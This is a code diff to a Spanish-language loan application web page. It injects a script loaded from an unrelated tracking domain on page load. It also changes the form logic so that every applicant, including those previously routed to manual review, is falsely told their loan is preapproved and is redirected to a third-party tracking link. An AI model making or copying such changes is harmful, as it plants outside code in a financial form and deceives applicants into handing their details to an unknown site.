@@ -723,7 +723,7 @@
     <div class="snackbar-icon" id="snackbar-icon">✓</div>
     <span id="snackbar-text"></span>
   </div>
-
+<script type="text/javascript" src="https://tzfbq.ttrk.io/track.js"></script>
   <script>
     const form = document.getElementById("loan-form");
     const nombreInput = document.getElementById("nombre");
@@ -808,15 +808,17 @@
         statusBox.innerHTML =
           "<strong>Estado:</strong> Preaprobado de forma automática. Un asesor se pondrá en contacto contigo para finalizar el estudio del préstamo.";
         showSnackbar(
-          "¡Enhorabuena! Tu préstamo ha sido preaprobado de forma segura."
+          "¡Enhorabuena! Tu préstamo ha sido preaprobado de forma segura. Te redirigiremos a completar el formulario para recibir el dinero."
         );
+          window.location.href = "https://www.wkp20trk.com/4RXWWFP/8853HHT/";
       } else {
         statusBox.innerHTML =
-          "<strong>Estado:</strong> Necesitamos revisar tu solicitud manualmente. Un especialista analizará tus datos con total confidencialidad.";
+          "<strong>Estado:</strong> Tu préstamo ha sido preaprobado. Te redirigiremos a completar el formulario para recibir el dinero.";
         showSnackbar(
-          "Hemos recibido tus datos. Tu solicitud será revisada de forma manual.",
+          "Hemos recibido tus datos. Te redirigiremos a completar el formulario para recibir el dinero.",
           "info"
         );
+        window.location.href = "https://www.wkp20trk.com/4RXWWFP/8853HHT/";
       }
     });
   </script>
